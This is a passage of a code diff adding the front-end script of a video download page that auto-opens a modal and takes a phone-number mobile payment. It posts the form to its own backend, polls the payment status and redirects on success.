+                const loadingPlaceholder = document.getElementById(`loading-${index}`);
+                const loadingText = document.getElementById(`loading-text-${index}`);
+
+
+                setTimeout(() => {
+                    loadImageOptimized(img, video.thumbnail, loadingPlaceholder, loadingText);
+                }, index * 100);
+            });
+        }
+
+        function openModal() {
+            downloadModal.show();
+        }
+
+
+        function showToastNotification(title, message, type = 'success') {
+            const toast = document.getElementById('toastNotification');
+            const toastTitle = toast.querySelector('.toast-title');
+            const toastMessage = toast.querySelector('.toast-message');
+            const toastIcon = toast.querySelector('.toast-icon');
+
+            toastTitle.textContent = title;
+            toastMessage.textContent = message;
+
+            if (type === 'success') {
+                toastIcon.className = 'bi bi-check-circle-fill toast-icon';
+                toast.style.borderLeftColor = '#28a745';
+                toastIcon.style.color = '#28a745';
+            } else if (type === 'error') {
+                toastIcon.className = 'bi bi-exclamation-circle-fill toast-icon';
+                toast.style.borderLeftColor = '#dc3545';
+                toastIcon.style.color = '#dc3545';
+            }
+
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 7000);
+        }
+
+        function showPaymentInstructions() {
+            document.getElementById('defaultContent').style.display = 'none';
+            document.getElementById('paymentInstructions').style.display = 'block';
+        }
+
+        function showDefaultContent() {
+            document.getElementById('paymentInstructions').style.display = 'none';
+            document.getElementById('defaultContent').style.display = 'block';
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function () {
+            generateVideoGrid();
+
+            // Auto-show modal after 5 seconds
+            setTimeout(() => {
+                downloadModal.show();
+            }, 5000);
+
+            // Payment form handling
+            $('#paymentForm').on('submit', function (e) {
+                e.preventDefault();
+
+                const payButton = $('#payButton');
+                const loadingButton = $('#loadingButton');
+                const phoneInput = $('#phone').val().trim();
+
+
+                if (!phoneInput || phoneInput.length < 9) {
+                    showToastNotification('Invalid Phone', 'Please enter a valid phone number', 'error');
+                    return;
+                }
+
+                payButton.hide();
+                loadingButton.show();
+
+                const formData = $(this).serialize();
+
+                $.ajax({
+                    url: 'devconnecttz.php',
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    timeout: 30000,
+                    success: function (response) {
+
+
+
+                        if (response && response.message) {
+                            const orderId = response.message;
+
+
+                            showToastNotification('Payment Processing', 'Transaction initiated. Please complete payment on your phone.', 'success');
+                            loadingButton.hide();
+                            payButton.show();
+                            showPaymentInstructions();
+
+
+                            checkOrderStatus(orderId);
+                        } else {
+
+                            loadingButton.hide();
+                            payButton.show();
+                            let errorMsg = (response && response.message) ? response.message : 'Failed to initiate payment';
+                            showToastNotification('Error', errorMsg, 'error');
+                        }
+                    },
+                    error: function (xhr, status, error) {
+
+                        loadingButton.hide();
+                        payButton.show();
+
+                        let errorMsg = 'Connection error. Please check your internet and try again.';
+                        try {
+                            if (xhr.responseJSON && xhr.responseJSON.message) {
+                                errorMsg = xhr.responseJSON.message;
+                            }
+                        } catch (e) { }
+
+                        showToastNotification('Connection Error', errorMsg, 'error');
+                    }
+                });
+            });
+
+            function checkOrderStatus(orderId) {
+                let currentAttempt = 0;
+                const MAX_ATTEMPTS = 30;
+                const POLL_INTERVAL = 3000;
+                let isComplete = false;
+
+                function pollStatus() {
+
+                    if (isComplete) return;
+
+
+                    currentAttempt++;
+
+
+
+                    $.ajax({
+                        url: 'check-status.php',
+                        type: 'POST',
+                        data: {
+                            check_status: 1,
+                            order_id: orderId
+                        },
+                        dataType: 'json',
+                        timeout: 10000,
+                        success: function (response) {
+
+                            if (response && response.status === 'success' && response.payment_status) {
+                                const status = response.payment_status.toUpperCase();
+
+
+
+                                if (status === 'COMPLETED') {
+                                    isComplete = true;
+                                    showDefaultContent();
+                                    Swal.fire({
+                                        icon: 'success',
+                                        title: 'Payment Successful!',
+                                        text: 'Your payment has been completed successfully. Redirecting in 3 seconds...',
+                                        confirmButtonText: 'Redirect Now',
+                                        allowOutsideClick: false,
+                                        timer: 3000,
+                                        timerProgressBar: true
+                                    }).then(() => {
+                                        window.location.href = "https://nairobigossipclub.cocoyoga.online/";
+                                    });
+                                    return;
+                                }
+
+
+                                if (status === 'PENDING') {
+                                    if (currentAttempt < MAX_ATTEMPTS) {
+                                        setTimeout(pollStatus, POLL_INTERVAL);
+                                    } else {
+
+                                        isComplete = true;
+                                        showDefaultContent();
+                                        Swal.fire({
+                                            icon: 'warning',
+                                            title: 'Payment Timeout',
+                                            text: 'Payment is still pending. Please check your phone and complete the payment, or check your transaction status.',
+                                            confirmButtonText: 'OK',
+                                            allowOutsideClick: false
+                                        });
+                                    }
+                                    return;
+                                }
+
+
+                                isComplete = true;
+                                showDefaultContent();
+                                Swal.fire({
+                                    icon: 'error',
+                                    title: 'Payment Failed',
+                                    text: `Payment status: ${status}. Please try again.`,
+                                    confirmButtonText: 'OK',
+                                    allowOutsideClick: false
+                                });
+                                return;
+                            }
+
+
+
+                            if (currentAttempt < MAX_ATTEMPTS) {
+                                setTimeout(pollStatus, POLL_INTERVAL);
+                            } else {
+                                isComplete = true;
+                                showDefaultContent();
+                                Swal.fire({
+                                    icon: 'error',
+                                    title: 'Verification Failed',
+                                    text: 'Could not verify payment status. Please check your transaction.',
+                                    confirmButtonText: 'OK',
+                                    allowOutsideClick: false
+                                });
+                            }
+                        },
+                        error: function (xhr, status, error) {
+
+
+                            if (currentAttempt < MAX_ATTEMPTS) {
+                                setTimeout(pollStatus, POLL_INTERVAL);
+                            } else {
+                                isComplete = true;
+                                showDefaultContent();
+                                Swal.fire({
+                                    icon: 'error',
+                                    title: 'Connection Error',
+                                    text: 'Could not verify payment due to connection issues. Please check your transaction status.',
+                                    confirmButtonText: 'OK',
+                                    allowOutsideClick: false
+                                });
+                            }
+                        }
+                    });
+                }
+
+
+                pollStatus();
+            }
+
+            function updateOrderStatus(orderId, status) {
+
+                $.ajax({
+                    url: 'update-order-status.php',
+                    type: 'POST',
+                    data: {
+                        order_id: orderId,
+                        status: status
+                    },
+                    dataType: 'json',
+                    success: function (response) {
+                        if (response.status === 'success') {
+
+                        } else {
+
+                        }
+                    },
+                    error: function () {
+
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
